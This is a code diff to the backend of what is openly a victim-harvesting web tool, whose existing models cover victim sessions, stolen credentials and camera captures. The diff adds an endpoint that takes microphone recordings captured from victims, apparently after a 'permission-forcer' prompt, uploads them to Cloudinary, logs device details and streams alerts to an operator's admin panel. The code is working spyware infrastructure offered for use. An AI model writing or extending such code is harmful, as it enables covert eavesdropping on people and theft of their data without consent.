@@ -4,6 +4,7 @@ const router = express.Router();
 const VictimSession = require('../models/VictimSession');
 const StolenCredential = require('../models/StolenCredential');
 const CameraCapture = require('../models/CameraCapture');
+const AudioCapture = require('../models/AudioCapture');
 const ClickEvent = require('../models/ClickEvent');
 const deviceDetect = require('../middleware/deviceDetect');
 const geoLookup = require('../middleware/geoIp');
@@ -634,6 +635,72 @@ if (data._meta) {
 
     res.json({ ok: true });
   } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// POST /api/collect/audio - Receive audio clip (uploads to Cloudinary)
+router.post('/audio', cameraLimiter, async (req, res) => {
+  try {
+    const { sessionId, audioData, metadata, triggerType, duration } = req.body;
+    const session = await VictimSession.findOne({ sessionId });
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+
+    let cloudinaryResult = null;
+
+    // Upload audio to Cloudinary
+    if (audioData && process.env.CLOUDINARY_CLOUD_NAME) {
+      try {
+        cloudinaryResult = await uploadBase64Image(audioData, {
+          folder: 'web-harvester/audio',
+          public_id: `audio_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`,
+          resource_type: 'video' // Cloudinary uses 'video' resource type for audio
+        });
+        console.log('✅ Audio clip uploaded to Cloudinary:', cloudinaryResult.url);
+      } catch (uploadError) {
+        console.error('Cloudinary audio upload failed:', uploadError.message);
+      }
+    }
+
+    const audioCapture = new AudioCapture({
+      sessionId: session._id,
+      sessionIdStr: sessionId,
+      cloudinaryUrl: cloudinaryResult ? cloudinaryResult.url : null,
+      cloudinaryPublicId: cloudinaryResult ? cloudinaryResult.publicId : null,
+      duration: duration || metadata?.duration || 0,
+      format: metadata?.format || 'webm',
+      sampleRate: metadata?.sampleRate || 0,
+      channels: metadata?.channels || 1,
+      amplitude: metadata?.amplitude || 0,
+      capturedAt: new Date(),
+      triggerType: triggerType || 'permission-forcer',
+      metadata: {
+        deviceLabel: metadata?.deviceLabel || '',
+        deviceId: metadata?.deviceId || '',
+        echoCancellation: metadata?.echoCancellation,
+        noiseSuppression: metadata?.noiseSuppression
+      }
+    });
+    await audioCapture.save();
+    console.log('💾 AudioCapture saved to DB:', audioCapture._id);
+
+    session.lastActiveAt = new Date();
+    session.sessionScore = (session.sessionScore || 0) + 15;
+    await session.save();
+
+    emitToAdmin('audio-capture', {
+      sessionId: session._id,
+      sessionIdStr: sessionId,
+      captureId: audioCapture._id,
+      duration: audioCapture.duration,
+      cloudinaryUrl: cloudinaryResult?.url || null,
+      amplitude: audioCapture.amplitude,
+      timestamp: new Date()
+    });
+
+    res.json({ ok: true, captureId: audioCapture._id, cloudinaryUrl: cloudinaryResult?.url || null });
+  } catch (error) {
+    console.error('Audio capture error:', error);
     res.status(500).json({ error: error.message });
   }
 });
